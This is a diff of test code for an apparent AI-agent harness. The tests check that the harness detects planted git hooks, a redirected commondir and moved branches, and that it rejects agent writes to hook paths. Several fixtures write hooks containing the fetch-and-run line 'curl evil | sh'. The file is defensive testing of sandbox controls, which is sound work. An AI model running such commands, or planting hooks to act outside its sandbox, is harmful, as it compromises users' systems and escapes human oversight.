@@ -1,6 +1,6 @@
 import { execFileSync, spawn } from 'node:child_process';
 import { createHash } from 'node:crypto';
-import { existsSync, mkdirSync, readFileSync, renameSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, readFileSync, realpathSync, renameSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
 import { dirname, join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
@@ -10,6 +10,7 @@ import {
   filterDriverOverrides,
   hostGit,
   hostGitHardeningArgs,
+  relativeHooksPathRule,
   reviewProfileDenial,
   scrubLaneCredentials,
   sharedGitStateChanges,
@@ -896,6 +897,67 @@ describe('copilot_run common git dir snapshot (a file-tool write swapped into th
     symlinkSync(join(root, 'elsewhere'), join(git, 'worktrees', 'mine'), 'junction');
     expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toContain('worktrees/mine');
     rmSync(join(git, 'worktrees', 'mine'));
+  });
+
+  it('detects a planted commondir, a submodule hook and a moved branch; ignores job branches and packing refs', () => {
+    const git = join(repo, '.git');
+    mkdirSync(join(git, 'modules', 'sub', 'hooks'), { recursive: true });
+    writeFileSync(join(git, 'modules', 'sub', 'config'), '[core]\n\tbare = false\n');
+    gitIn(repo, 'branch', 'feature');
+    const before = sharedGitStateSnapshot(git);
+    expect(before['refs/heads/main']).toMatch(/^ref [0-9a-f]{40}/);
+
+    // Packing refs, and job branches that concurrent jobs create and move, are no change.
+    gitIn(repo, 'pack-refs', '--all');
+    gitIn(repo, 'branch', 'omc-team/copilot-run/cr-other');
+    expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual([]);
+
+    writeFileSync(join(git, 'modules', 'sub', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
+    writeFileSync(join(repo, 'b.txt'), 'b\n');
+    gitIn(repo, 'add', 'b.txt');
+    gitIn(repo, 'commit', '-q', '-m', 'moves main');
+    // Last: a planted commondir points git itself elsewhere.
+    writeFileSync(join(git, 'commondir'), `${join(root, 'evil')}\n`);
+    expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual(['commondir', 'modules/sub', 'refs/heads/main']);
+  });
+});
+
+describe('copilot_run hook paths', () => {
+  it('a hook planted in an ignored dir under core.hooksPath is a protected change', async () => {
+    gitIn(repo, 'config', 'core.hooksPath', '.husky/_');
+    const m = manager('hang');
+    const started = m.start({ prompt: 'implement', cwd: repo });
+    await new Promise((r) => setTimeout(r, 50));
+    const wt = (started.worktree as { path: string }).path;
+    // The sandboxed shell writes husky's self-ignoring hook dir; no file tool is asked.
+    mkdirSync(join(wt, '.husky', '_'), { recursive: true });
+    writeFileSync(join(wt, '.husky', '_', '.gitignore'), '*\n');
+    writeFileSync(join(wt, '.husky', '_', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
+    const done = await m.cancel(started.jobId as string);
+    expect(done.changes?.untrackedFiles).toEqual([]);
+    expect(done.changes?.protectedChanges).toEqual(['.husky/_/.gitignore', '.husky/_/pre-commit']);
+  });
+
+  it('reads core.hooksPath as git does in the job worktree (includeIf gitdir)', async () => {
+    const inc = join(root, 'worktree-hooks.gitconfig');
+    writeFileSync(inc, '[core]\n\thooksPath = tools/hooks\n');
+    const gitDirPattern = `${realpathSync.native(join(repo, '.git')).replace(/\\/g, '/')}/worktrees/**`;
+    gitIn(repo, 'config', `includeIf.gitdir:${gitDirPattern}.path`, inc.replace(/\\/g, '/'));
+    // The main checkout does not see it; the job worktree does.
+    expect(relativeHooksPathRule(repo)).toBeNull();
+    const m = manager('hang');
+    const started = m.start({ prompt: 'implement', cwd: repo });
+    await new Promise((r) => setTimeout(r, 50));
+    const wt = (started.worktree as { path: string }).path;
+    const decide = calls.sessions[0].onPermissionRequest as (req: object, ctx: object) => unknown;
+    expect(await decide({ kind: 'write', path: join(wt, 'tools', 'hooks', 'pre-commit') }, { sessionId: 's' })).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/protected merge-rule path tools\/hooks\/pre-commit/) });
+    await m.cancel(started.jobId as string);
+  });
+
+  it('fails closed when git cannot read core.hooksPath', () => {
+    expect(relativeHooksPathRule(repo)).toBeNull();
+    writeFileSync(join(repo, '.git', 'config'), `${readFileSync(join(repo, '.git', 'config'), 'utf8')}\n[core\n`);
+    expect(() => relativeHooksPathRule(repo)).toThrow(/cannot read core\.hooksPath/);
   });
 });
 
